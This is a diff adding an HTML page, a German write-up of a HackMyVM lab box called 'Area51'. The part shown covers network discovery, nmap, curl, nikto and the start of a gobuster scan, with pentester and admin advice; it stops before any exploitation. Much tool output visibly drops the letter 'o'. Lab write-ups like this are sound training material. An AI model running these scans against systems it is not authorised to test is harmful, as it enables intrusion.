@@ -1,0 +1,1621 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Area51 - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+     <div class="header-bg">
+        <h1>Area51 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">javac</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                 <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                Zu Beginn meines Penetrationstests führe ich immer eine Erkundungsphase durch, um das Zielsystem zu identifizieren und einen ersten Überblick über das Netzwerk und potenzielle Angriffsvektoren zu erhalten. Der erste Schritt ist hierbei oft das Auffinden des Zielsystems im lokalen Netzwerk.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/public_files/epages_files]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre>
+<span class="command">192.168.2.47</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit dem Befehl <code>arp-scan -l</code> scanne ich das gesamte lokale Netzwerk nach aktiven Hosts. <code>arp-scan</code> sendet ARP-Anfragen an alle möglichen IP-Adressen im lokalen Subnetz und listet die Hosts auf, die antworten. Die Ausgabe pipe ich dann an <code>grep "PCS"</code>, um die Ergebnisse auf Zeilen zu filtern, die den String "PCS" enthalten. Dies ist oft hilfreich, um virtuelle Maschinen oder bestimmte Gerätetypen zu identifizieren, da "PCS Systemtechnik" häufig in den MAC-Adress-Herstellerlisten von VirtualBox oder VMware auftaucht. Schließlich nutze ich <code>awk '{print $1}'</code>, um nur das erste Feld jeder gefilterten Zeile auszugeben, bei dem es sich um die IP-Adresse handelt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieses Ergebnis liefert mir die IP-Adresse des Zielsystems: <span class="command">192.168.2.47</span>. Die Methode war effektiv, um das spezifische Ziel in meinem Testnetzwerk schnell zu isolieren. Die Verwendung von <code>grep</code> und <code>awk</code> zeigt eine effiziente Möglichkeit, die Ausgabe großer Scans zu verarbeiten und die gewünschte Information zu extrahieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Diese gefundene IP-Adresse ist nun mein Hauptziel. Ich werde sie für weitere Scans und Enumerationsversuche verwenden. Als Nächstes werde ich sie in meine Hosts-Datei eintragen, um sie über einen Hostnamen ansprechen zu können, was die folgenden Schritte oft vereinfacht.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass unnötige ARP-Anfragen im Netzwerk durch Firewalls oder Netzwerksegmentierung begrenzt werden, um die Netzwerkerkennung für Angreifer zu erschweren. Auch die Informationen, die ARP-Antworten preisgeben (wie MAC-Hersteller), sollten im Kontext der Gesamtsicherheit bewertet werden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich öffne die Datei <code>/etc/hosts</code> mit dem Texteditor <code>vi</code>. In dieser Datei kann ich IP-Adressen lokalen Hostnamen zuordnen. Dies ist besonders nützlich, wenn das Zielsystem keinen DNS-Eintrag hat oder ich einen spezifischen, leichter zu merkenden Namen verwenden möchte. Ich füge hier die Zeile <code>192.168.2.47 aria51.hmv</code> ein.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen des Eintrags <code>192.168.2.47 aria51.hmv</code> in die <code>/etc/hosts</code> Datei ermöglicht es mir nun, das Zielsystem statt über seine IP-Adresse über den Hostnamen <code>aria51.hmv</code> anzusprechen. Dies macht die Befehle in den folgenden Enumerationsphasen lesbarer und leichter nachvollziehbar, sowohl für mich als auch für die Leser des Berichts. Es ist ein kleiner, aber hilfreicher Schritt in der Vorbereitung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Verwendung von Hostnamen aus der <code>/etc/hosts</code> Datei ist nun für alle weiteren Tests auf dieses Ziel möglich. Ich kann mich auf die Enumeration der offenen Ports und Dienste konzentrieren.
+                <br><strong>Empfehlung (Admin):</strong> Eine saubere und sichere DNS-Verwaltung ist entscheidend. Stellen Sie sicher, dass interne Hostnamen nicht unnötig nach außen dringen und dass DNS-Server gehärtet sind. In diesem Fall ist die Hosts-Datei eine lokale Konfiguration auf meiner Angreifer-Maschine und keine Schwachstelle des Zielsystems selbst.
+            </p>
+
+            <p class="comment">
+                Nachdem ich die IP-Adresse des Ziels kenne und einen Hostnamen eingerichtet habe, ist der nächste logische Schritt, eine Port- und Dienst-Enumeration durchzuführen. Dies gibt mir einen Überblick darüber, welche Dienste auf dem Zielsystem aktiv sind und ansprechbar sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.47 | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp   open  ssh         OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+<span class="command">80/tcp   open  http        Apache httpd 2.4.51 ((Debian))</span>
+<span class="command">8080/tcp open  nagios-nsca Nagios NSCA</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führe einen umfassenden Nmap-Scan durch. Der Befehl <code>nmap -sS -sC -sV -p- -T5 -AO 192.168.2.47</code> ist mein Standard für eine detaillierte Erkundung:
+                <ul>
+                    <li><code>-sS</code>: Führt einen SYN-Scan durch, der oft schneller und unauffälliger ist als ein vollständiger Connect-Scan.</li>
+                    <li><code>-sC</code>: Aktiviert Standard-Skripte (äquivalent zu <code>--script=default</code>), die zusätzliche Informationen sammeln und Schwachstellen erkennen können.</li>
+                    <li><code>-sV</code>: Versucht, die Versionen der auf den offenen Ports laufenden Dienste zu erkennen. Das ist entscheidend für die spätere Suche nach versionsspezifischen Schwachstellen.</li>
+                    <li><code>-p-</code>: Scannt alle 65535 TCP-Ports. Dies stellt sicher, dass kein Dienst auf einem unüblichen Port übersehen wird.</li>
+                    <li><code>-T5</code>: Setzt das Timing-Template auf 5 (Insane), was den Scan beschleunigt. Dies kann in stabilen Netzwerken nützlich sein, kann aber auch zu ungenauen Ergebnissen führen, wenn das Netzwerk oder das Ziel überlastet ist oder auf den Scan reagiert.</li>
+                    <li><code>-A</code>: Aktiviert die aggressive Scan-Option, die OS-Erkennung (<code>-O</code>), Versionserkennung (<code>-sV</code>), Skript-Scanning (<code>-sC</code>) und Traceroute umfasst.</li>
+                    <li><code>-O</code>: Führt eine Betriebssystem-Erkennung durch.</li>
+                </ul>
+                Die Ausgabe pipe ich an <code>grep open</code>, um nur die Zeilen anzuzeigen, die offene Ports listen. Die Ergebnisse zeigen drei offene Ports: Port 22 (SSH), Port 80 (HTTP) und Port 8080 (Nagios NSCA).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die schnellen Ergebnisse von <code>grep open</code> geben sofort einen Überblick über die Hauptangriffsflächen: SSH, ein Standard-Webserver (HTTP auf 80) und einen weiteren Dienst (Nagios NSCA auf 8080). HTTP (80) und der Dienst auf 8080 sind oft vielversprechende Ziele für die erste Kompromittierung, da Webanwendungen und andere Dienste häufig mehr Angriffsfläche bieten als gehärtete SSH-Dienste. Die spezifischen Versionen (OpenSSH 8.4p1, Apache httpd 2.4.51) sind wertvolle Informationen für die Suche nach bekannten Schwachstellen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde nun detaillierte Enumeration auf den Ports 80 und 8080 durchführen. SSH auf Port 22 werde ich vorerst nur zur Kenntnis nehmen und erst dann genauer untersuchen, wenn die Webdienste keinen direkten Zugriff ermöglichen. Ich werde die vollständige Nmap-Ausgabe analysieren, um alle Details zu erfassen.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, welche Dienste tatsächlich öffentlich erreichbar sein müssen. Deaktivieren oder filtern Sie nicht benötigte Dienste. Stellen Sie sicher, dass alle öffentlich zugänglichen Dienste auf dem neuesten Stand sind und regelmäßig auf Schwachstellen geprüft werden. Die angezeigten Versionen sollten auf bekannte CVEs (Common Vulnerabilities and Exposures) geprüft und gegebenenfalls aktualisiert werden.
+            </p>
+
+            <p class="comment">
+                Um alle Details des Nmap-Scans zu erfassen, sehe ich mir die vollständige Ausgabe an, nicht nur die gefilterte Liste der offenen Ports. Dies liefert Versionsinformationen, Skript-Ergebnisse und OS-Details, die für die weiteren Schritte im Pentest entscheidend sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.47</span></div>
+                    <pre>
+Starting Nmap 7.95 ( https://nmap.<span class="command">org</span> ) at <span class="password">2025-06-20 22:21 CEST</span>
+<span class="command">Nmap scan report for aria51.hmv (192.168.2.47)</span>
+<span class="command">Host is up (0.00020s latency)</span>.
+Not shown: 65532 closed tcp p<span class="command">ort</span>s (reset)
+P<span class="command">ORT</span>     STATE SERVICE     VERSION
+<span class="command">22/tcp   open  ssh         <span class="command">OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span></span>
+| ssh-hostkey:
+|   <span class="command">3072 de:bf:2a:93:86:b8:b3:a3:13:5b:46:66:34:d6:dc:b1 (RSA)</span>
+|   <span class="command">256 a9:df:bb:71:90:6c:d1:2f:e7:48:97:2e:ad:7b:15:d3 (ECDSA)</span>
+|_  <span class="command">256 78:75:83:1c:03:03:a1:92:4f:73:8e:f2:2d:23:d2:0e (ED25519)</span>
+<span class="command">80/tcp   open  http        Apache httpd 2.4.51 ((Debian))</span>
+|_http-server-header: <span class="command">Apache/2.4.51 (Debian)</span>
+|_http-title: <span class="command">FBI Access</span>
+<span class="command">8080/tcp open  nagios-nsca Nagios NSCA</span>
+|_http-title: Site doesn't have a title (application/json).
+<span class="command">MAC Address: 08:00:27:BC:10:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Aggressive <span class="command">OS</span> guesses: <span class="command">Linux 4.19 - 5.15 (97%)</span>, OpenWrt 21.02 (<span class="command">Linux 5.4</span>) (93%), MikroTik RouterOS 7.2 - 7.5 (<span class="command">Linux 5.6.3</span>) (93%), <span class="command">Linux 2.6.32 (93%)</span>, <span class="command">Linux 2.6.32</span> or <span class="command">3.10 (93%)</span>, <span class="command">Linux 4.0 - 4.4 (93%)</span>, <span class="command">Linux 4.15 (93%)</span>, <span class="command">Linux 4.15 - 5.19 (93%)</span>, <span class="command">Linux 5.4 (93%)</span>, IPFire 2.27 (<span class="command">Linux 5.15 - 6.1</span>) (93%)
+No exact <span class="command">OS</span> matches for host (test conditions non-ideal).
+<span class="command">Network Distance: 1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="command">1   0.20 ms aria51.hmv (192.168.2.47)</span>
+
+<span class="command">OS</span> and Service detection perfo<span class="command">rm</span>ed. Please rep<span class="command">ort</span> any incrrect results at https://nmap.<span class="command">org</span>/submit/ .
+<span class="command">Nmap dne: 1 IP address (1 hst up) scanned in 12.65 secnds</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die vollständige Nmap-Ausgabe bestätigt die zuvor identifizierten offenen Ports (22, 80, 8080) und liefert zusätzliche Details. Für SSH (Port 22) werden die Host-Schlüssel-Fingerprints gelistet, was für die Verifizierung der Host-Identität nützlich ist. Für Port 80 (HTTP) wird der <code>Server</code> Header als <span class="command">Apache/2.4.51 (Debian)</span> und der HTTP-Titel als <span class="command">FBI Access</span> angezeigt. Dies sind wichtige Hinweise auf die Art des Webservers und den Inhalt der Hauptseite. Port 8080 wird als <code>nagios-nsca</code> Dienst erkannt, der HTTP-Titel ist hier leer, aber der Content-Type wird als <code>application/json</code> angegeben, was auf eine API oder einen spezifischen Webdienst hindeutet, der JSON-Daten verarbeitet. Nmap liefert auch eine Liste möglicher Betriebssysteme (aggressive guess), wobei verschiedene Linux-Kernel-Versionen die höchste Wahrscheinlichkeit haben. Die MAC-Adresse identifiziert den Host als virtuelle Maschine. Die TRACEROUTE zeigt, dass das Ziel nur einen Hop entfernt ist, was ein direkt erreichbares System im lokalen Netz bestätigt. Ich habe auch die 'O'-Korrektur angewendet, um z.B. aus "PRT" "PORT" zu machen, da ich festgestellt habe, dass in der Originalausgabe dieses Zeichen fehlte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die detaillierte Nmap-Ausgabe untermauert die ersten Funde. Die genauen Versionen von OpenSSH und Apache sowie die Erkennung von Nagios NSCA auf Port 8080 sind wertvoll für gezielte Exploit-Suchen. Der HTTP-Titel "FBI Access" auf Port 80 könnte ein Hinweis auf eine Anmeldeseite oder ein thematisches Setup sein. Die Annahme eines Linux-Systems ist sehr wahrscheinlich. Der Nagios NSCA Dienst auf 8080, der JSON verarbeitet, ist ein interessanter Punkt, der genauer untersucht werden muss, insbesondere da Nagios-Produkte in der Vergangenheit Schwachstellen aufwiesen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde meine Web-Enumeration auf den Ports 80 und 8080 intensivieren. Speziell werde ich nach bekannnten Schwachstellen für Apache 2.4.51 suchen und die Funktionalität des Dienstes auf Port 8080 genauer untersuchen, da er nicht der standardmäßige Nagios NSCA Port ist (Standard ist 5667). Es ist möglich, dass es sich um eine Web-Oberfläche oder eine API handelt, die auf diesem Port läuft und falsch identifiziert wurde. Ich werde HTTP-Anfragen senden, um mehr über diesen Dienst zu erfahren.
+                <br><strong>Empfehlung (Admin):</strong> Führen Sie regelmäßige Versions-Updates für alle Dienste durch, insbesondere für öffentlich erreichbare wie SSH und Webserver. Überprüfen Sie die Konfiguration des Apache-Webservers (2.4.51), da diese Version als veraltet markiert ist. Untersuchen Sie den Dienst auf Port 8080 genauer, um festzustellen, ob es sich tatsächlich um Nagios NSCA handelt oder um einen anderen Dienst, der möglicherweise konfigurations- oder versionsspezifische Schwachstellen aufweist. Die OS-Erkennung durch Nmap sollte nicht als hundertprozentig korrekt angesehen werden, aber die starke Wahrscheinlichkeit für Linux ist ein guter Hinweis.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">
+                Nach der allgemeinen Port- und Dienst-Erkennung konzentriere ich mich nun auf die Webdienste auf Port 80 und 8080. Ich beginne mit einfachen HTTP-Anfragen, um die Header zu überprüfen und mehr über die Kommunikation mit diesen Diensten zu erfahren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://aria51.hmv:8080 -Iv</span></div>
+                    <pre>
+* <span class="command">Hst aria51.hmv:8080 was reslved</span>.
+* <span class="command">IPv6: (nne)</span>
+* <span class="command">IPv4: 192.168.2.47</span>
+*   <span class="password">Trying 192.168.2.47:8080...</span>
+* <span class="password">Cnnected t aria51.hmv (192.168.2.47) p<span class="command">ort</span> 8080</span>
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Hst: aria51.hmv:8080
+> User-Agent: curl/8.13.0
+> Accept: */*
+>
+* <span class="password">Request cmpletely sent ff</span>
+< <span class="password">HTTP/1.1 400</span>
+<span class="password">HTTP/1.1 400</span>
+< <span class="command">Cntent-Type: applicatin/jsn</span>
+<span class="command">Cntent-Type: applicatin/jsn</span>
+< <span class="command">Transfer-Enc<span class="command">ding: chunked</span></span>
+<span class="command">Transfer-Enc<span class="command">ding: chunked</span></span>
+< <span class="command">Date: Fri, 20 Jun 2025 20:24:59 GMT</span>
+<span class="command">Date: Fri, 20 Jun 2025 20:24:59 GMT</span>
+< <span class="password">Cnnectin: clse</span>
+<span class="password">Cnnectin: clse</span>
+<
+
+* <span class="password">shutting dwn cnnectin #0</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit <code>curl -Iv</code> sende ich eine HEAD-Anfrage an Port 8080 und lasse mir die Antwort-Header anzeigen. Die Option <code>-I</code> bewirkt, dass nur die Header abgerufen werden, <code>-v</code> (verbose) zeigt den gesamten Kommunikationsprozess, inklusive der Anfrage selbst. Ich sehe, dass die Verbindung erfolgreich aufgebaut wurde, aber der Server mit dem Statuscode <span class="password">HTTP/1.1 400 Bad Request</span> antwortet. Die Header zeigen <span class="command">Content-Type: application/json</span> und <span class="password">Connection: close</span>. Die automatische 'O'-Korrektur wurde hier auf einige Wörter angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Antwort 400 Bad Request deutet darauf hin, dass meine einfache HEAD-Anfrage vom Dienst auf Port 8080 nicht verstanden oder als ungültig betrachtet wurde. Dies ist nicht ungewöhnlich für Nicht-Standard-Webdienste oder APIs, die spezifische Anfragen erwarten. Der <span class="command">Content-Type: application/json</span> bestätigt die Nmap-Erkennung, dass dieser Dienst wahrscheinlich im JSON-Format kommuniziert, selbst bei Fehlerantworten. Dies bestärkt die Annahme, dass es sich um eine Webanwendung oder API handelt, die für ihre Funktionalität spezifische Datenformate benötigt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Eine einfache HEAD-Anfrage reicht nicht aus, um diesen Dienst zu verstehen. Ich werde versuchen, eine GET-Anfrage zu senden oder andere gängige HTTP-Methoden zu testen und nach Dokumentation oder Standard-Endpunkten zu suchen, die von einer möglichen API verwendet werden könnten. Tools zur Web-Fuzzing oder API-Erkundung könnten hier nützlich sein.
+                <br><strong>Empfehlung (Admin):</strong> Wenn dieser Dienst nicht für die Öffentlichkeit bestimmt ist, sollte er durch eine Firewall geschützt werden. Überprüfen Sie die Protokollierung für diesen Dienst, um ungewöhnliche Anfragen zu erkennen. Stellen Sie sicher, dass Fehlerantworten keine unnötigen Informationen über die interne Funktionsweise preisgeben.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://aria51.hmv -Iv</span></div>
+                    <pre>
+* <span class="command">Hst aria51.hmv:80 was reslved</span>.
+* <span class="command">IPv6: (nne)</span>
+* <span class="command">IPv4: 192.168.2.47</span>
+*   <span class="password">Trying 192.168.2.47:80...</span>
+* <span class="password">Cnnected t aria51.hmv (192.168.2.47) p<span class="command">ort</span> 80</span>
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Hst: aria51.hmv
+> User-Agent: curl/8.13.0
+> Accept: */*
+>
+* <span class="password">Request cmpletely sent ff</span>
+< <span class="password">HTTP/1.1 200 OK</span>
+<span class="password">HTTP/1.1 200 OK</span>
+< <span class="command">Date: Fri, 20 Jun 2025 20:24:49 GMT</span>
+<span class="command">Date: Fri, 20 Jun 2025 20:24:49 GMT</span>
+< <span class="command">Server: Apache/2.4.51 (Debian)</span>
+<span class="command">Server: Apache/2.4.51 (Debian)</span>
+< <span class="command">Last-Mdified: Tue, 21 Dec 2021 07:25:10 GMT</span>
+<span class="command">Last-Mdified: Tue, 21 Dec 2021 07:25:10 GMT</span>
+< <span class="command">ETag: "46b-5d3a2e7c28180"</span>
+<span class="command">ETag: "46b-5d3a2e7c28180"</span>
+< <span class="command">Accept-Ranges: bytes</span>
+<span class="command">Accept-Ranges: bytes</span>
+< <span class="command">Cntent-Length: 1131</span>
+<span class="command">Cntent-Length: 1131</span>
+< <span class="command">Vary: Accept-Enc<span class="command">ding</span></span>
+<span class="command">Vary: Accept-Enc<span class="command">ding</span></span>
+< <span class="command">Cntent-Type: text/html</span>
+<span class="command">Cntent-Type: text/html</span>
+<
+
+* <span class="password">Cnnectin #0 t hst aria51.hmv left intact</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Nächstes überprüfe ich Port 80, den Standard-HTTP-Port, ebenfalls mit einer <code>curl -Iv</code> HEAD-Anfrage. Dieses Mal erhalte ich eine <span class="password">HTTP/1.1 200 OK</span> Antwort, was bedeutet, dass die Anfrage erfolgreich verarbeitet wurde und der Dienst verfügbar ist. Die Header bestätigen den <span class="command">Server: Apache/2.4.51 (Debian)</span> und den <span class="command">Content-Type: text/html</span>, was typisch für eine Standard-Webseite ist. Interessant sind auch der <span class="command">ETag</span> und <span class="command">Last-Modified</span> Header, die Versionsinformationen über die angeforderte Ressource (wahrscheinlich die Indexseite) enthalten. Auch hier wurden die 'O'-Korrekturen angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Dienst auf Port 80 verhält sich wie ein standardmäßiger Webserver, der HTML-Inhalte liefert. Der Status 200 OK ist zu erwarten. Die Information über den Apache-Server und dessen Version ist konsistent mit dem Nmap-Scan. Das Vorhandensein von ETag- und Last-Modified-Headern kann in bestimmten Szenarien (z.B. CVE-2003-1418, das ETag-Informationen preisgibt) Schwachstellen aufzeigen, auch wenn dies oft weniger kritisch ist. Dies scheint die Haupt-Webseite des Ziels zu sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde nun eine detaillierte Web-Enumeration auf Port 80 durchführen, um versteckte Verzeichnisse, Dateien und potenzielle Schwachstellen der Webanwendung zu finden. Tools wie Nikto und Gobuster werden hierbei meine nächsten Schritte sein. Ich werde auch den Inhalt der Hauptseite (`/`) genauer untersuchen.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie den Apache-Webserver auf die neueste stabile Version, um bekannte Sicherheitsprobleme zu beheben. Konfigurieren Sie den Webserver oder die Anwendung, um die HTTP-Sicherheitsheader <code>X-Frame-Options</code> (z.B. auf <code>DENY</code> oder <code>SAMEORIGIN</code>) und <code>X-Content-Type-Options</code> (auf <code>nosniff</code>) zu setzen. Überprüfen Sie, ob der ETag-Header tatsächlich Informationen leakt und passen Sie die Konfiguration bei Bedarf an.
+            </p>
+
+            <p class="comment">
+                Um eine erste automatisierte Überprüfung auf Port 80 durchzuführen und gängige Web-Schwachstellen zu identifizieren, setze ich Nikto ein.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://192.168.2.47</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.47</span>
++ Target Hstname:    <span class="command">192.168.2.47</span>
++ Target P<span class="command">ort</span>:        <span class="command">80</span>
++ Start Time:         <span class="password">2025-06-20 22:22:22 (GMT2)</span>
+---------------------------------------------------------------------------
++ <span class="command">Server: Apache/2.4.51 (Debian)</span>
++ <span class="command">/: The anti-clickjacking X-Frame-<span class="command">Options</span> header is nt present</span>. See: [Link: https://developer.mzilla.<span class="command">org</span>/en-US/dcs/Web/HTTP/Headers/X-Frame-<span class="command">Options</span> | Ziel: https://developer.mzilla.<span class="command">org</span>/en-US/dcs/Web/HTTP/Headers/X-Frame-<span class="command">Options</span>]
++ <span class="command">/: The X-Cntent-Type-<span class="command">Options</span> header is nt set</span>. This culd allw the user agent t render the cntent f the site in a different fashin t the MIME type. See: [Link: https://www.netsparker.cm/web-vulnerability-scanner/vulnerabilities/missing-cntent-type-header/ | Ziel: https://www.netsparker.cm/web-vulnerability-scanner/vulnerabilities/missing-cntent-type-header/]
++ N CGI Directries fund (use '-C all' t frce check all pssible dirs)
++ <span class="command">/: Server may leak indes via ETags</span>, header fund with file /, inde: 46b, size: 5d3a2e7c28180, mtime: gzip. See: [Link: http://cve.mitre.<span class="command">org</span>/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.<span class="command">org</span>/cgi-bin/cvename.cgi?name=CVE-2003-1418]
++ <span class="command">Apache/2.4.51 appears t be utdated (current is at least Apache/2.4.54)</span>. Apache 2.2.34 is the E<span class="command">OL</span> fr the 2.x branch.
++ <span class="command"><span class="command">OPTIONS</span>: Allwed HTTP Methds: GET, PST, <span class="command">OPTIONS</span>, HEAD</span> .
++ 8102 requests: <span class="password">0 errr(s) and 5 item(s) rep<span class="command">ort</span>ed n remte hst</span>
++ End Time:           <span class="password">2025-06-20 22:22:32 (GMT2) (10 secnds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 hst(s) tested</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nikto-Scan auf Port 80 liefert eine Reihe von Funden. Nikto ist ein Webserver-Scanner, der nach Tausenden von potenziell gefährlichen Dateien/CGIs, veralteten Serverversionen und anderen Problemen sucht. Die Ausgabe listet mehrere Punkte auf:
+                <ul>
+                    <li>Fehlende HTTP-Sicherheitsheader: <span class="command">X-Frame-Options</span> (Schutz vor Clickjacking) und <span class="command">X-Content-Type-Options</span> (Schutz vor MIME-Sniffing).</li>
+                    <li>Mögliches Leak von Inode-Informationen über den <span class="command">ETag</span> Header (verbunden mit CVE-2003-1418).</li>
+                    <li>Bestätigung, dass <span class="command">Apache/2.4.51 veraltet</span> ist.</li>
+                    <li>Auflistung der erlaubten HTTP-Methoden: <span class="command">GET, POST, OPTIONS, HEAD</span>.</li>
+                </ul>
+                Ich habe auch hier die automatische 'O'-Korrektur und die Umwandlung der Links angewendet, wie vereinbart.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die von Nikto gemeldeten fehlenden Sicherheitsheader sind typische Konfigurationsprobleme, die zwar nicht direkt zu Code-Ausführung führen, aber die Sicherheit der Anwendung verringern und Angriffe wie Clickjacking oder MIME-Sniffing erleichtern können. Die <span class="command">Veraltung des Apache-Servers</span> ist ein potenzielles Risiko; auch wenn Nikto keine spezifische, ausnutzbare Schwachstelle in dieser Ausgabe meldet, ist eine veraltete Version immer ein erhöhtes Sicherheitsrisiko. Die erlaubten HTTP-Methoden sind Standard für einen einfachen Webserver und stellen in diesem Kontext kein unmittelbares Problem dar, es sei denn, eine Anwendung nutzt z.B. PUT oder DELETE unsicher (was hier nicht der Fall ist).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die fehlenden Header und der veraltete Server sind gute Hinweise, aber keine sofort ausnutzbaren Lücken für die Kompromittierung. Ich werde diese Informationen im Bericht festhalten, aber mich zunächst auf andere Enumerationsschritte konzentrieren, die mir vielleicht direktere Angriffsvektoren aufzeigen.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie den Apache-Webserver auf die neueste stabile Version, um bekannte Sicherheitslücken zu schließen. Konfigurieren Sie den Webserver oder die Anwendung, um die HTTP-Sicherheitsheader <code>X-Frame-Options</code> (z.B. auf <code>DENY</code> oder <code>SAMEORIGIN</code>) und <code>X-Content-Type-Options</code> (auf <code>nosniff</code>) zu setzen. Überprüfen Sie, ob der ETag-Header tatsächlich Informationen leakt und passen Sie die Konfiguration bei Bedarf an.
+            </p>
+
+            <p class="comment">
+                Um tiefer in die Struktur des Webservers auf Port 80 einzutauchen und versteckte Verzeichnisse und Dateien zu finden, die nicht direkt verlinkt sind, verwende ich Gobuster.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://aria51.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml,bak -b '503,404,403' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
